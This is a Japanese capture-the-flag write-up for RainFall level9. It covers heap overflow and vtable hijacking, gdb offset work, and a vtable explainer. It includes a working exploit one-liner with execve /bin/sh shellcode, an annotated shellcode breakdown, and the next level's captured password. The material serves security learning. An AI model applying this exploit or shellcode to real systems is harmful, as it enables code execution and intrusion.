# level9
## 方針

ヒープオーバフローを行い,
memcpy(this + 4,param_1,__n);からthis_00を書き換え、(**(code **)*this_00)(this_00,this);でシェルコードを実行する。

### コードの処理

コンストラクタでthisの先頭にvtableへのポインタを書き込んでる。
```
*(undefined ***)this = &PTR_operator+_08048848;
*(int *)(this + 0x68) = param_1;
return;
```

this_00の先頭のポインタはvtableへのポインタ。
vtableの指している配列の関数ポインタを関数ポインタで呼び出してる
```
(**(code **)*this_00)(this_00, this);
```

```
.....
0x0804867c <+136>:   mov    0x10(%esp),%eax ; this_00をeaxにロード
0x08048680 <+140>:   mov    (%eax),%eax     ; this_00の先頭(vtableポインタ)をeaxにロード
0x08048682 <+142>:   mov    (%eax),%edx     ; vtableの先頭 (関数ポインタ)をedxにロード
....
0x08048693 <+159>:   call   *%edx           ; 関数ポインタ呼び出し
```
つまり、ポインタのポインタのポインタみたいになっている。

### thisとthis00のオフセット
memcpyでthis00を書き換えるためにオフセットを調べる
```
(gdb) disass main
0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
  0x0804861c <+40>:    mov    %eax,%ebx
....
  0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
  0x0804863e <+74>:    mov    %eax,%ebx
....
End of assembler dump.
(gdb) b *0x0804861c
Breakpoint 1 at 0x804861c
(gdb) b *0x0804863e
Breakpoint 2 at 0x804863e
(gdb) r
Starting program: /home/user/level9/level9
[Inferior 1 (process 18816) exited with code 01]
(gdb)
(gdb) r a

(gdb) info registers
eax            0x804a008
(gdb) next
(gdb) info registers
eax            0x804a078

thisとthis00のアドレス差は0x70(112 byte)なのがわかる
```

### ans

ポインタのポインタのポインタみたいにしないといけないからシェルコードまでに２回経由している。

this + 4(memcpy) +
24(shellcode) +
80(offset) +
4(this + 4のアドレスつまり、shellcodeの先頭) + // this00 -4
4(this00のアドレス - 4 ↑のアドレスを指す. 0x804a074) //this00



```
level9@RainFall:~$ ./level9 $(python -c "import sys; sys.stdout.write('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'  + 'a' * 80 + '\x0c\xa0\x04\x08' + '\x74\xa0\x04\x08')")
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```


## memo
### vtable
仮想関数を使うときに、正しい関数を呼び出すためのテーブル

```
class Animal {
  virtual void speak();
};

class Dog : public Animal {
  void speak();
};

class Cat : public Animal {
  void speak();
};

Animal*a = new Dog();
a->speak();
```

上記のコードをみると、
コンパイル時にはaはAnimal型しかわからない
でも実行時には、Dogのspeakを呼びたい
これをうまくやるのがvtableの仕組み

クラスごとにvtableがある
オブジェクトごとにvptrを持っている
関数呼び出し時に、オブジェクトが持っているvptrをたどって
vtableから正しい関数ポインタを見つけて呼び出す

### シェルコード


```
\x31\xc0              xor    eax, eax  0クリア
\x50                  push   eax       スタックに0をpush
\x68\x2f\x2f\x73\x68   push   0x68732f2f  "//sh" をスタックにpush
\x68\x2f\x62\x69\x6e   push   0x6e69622f  "/bin" をスタックにpush
\x89\xe3              mov    ebx, esp  ebxに現在のesp（= "/bin/sh"の先頭アドレス）をセット
\x50                  push   eax  NULLをpush
\x53                  push   ebx  /bin/shのポインタ（ebx）をpush
\x89\xe1              mov    ecx, esp ecxに現在のesp（argv配列へのポインタ）をセット
\x99                  cdq edx=0にする
\xb0\x0b              mov    al, 0xb eaxに0xbをセット(execveのsyscall)
\xcd\x80              int    0x80 eaxに入ってるシステムコール番号を実行
```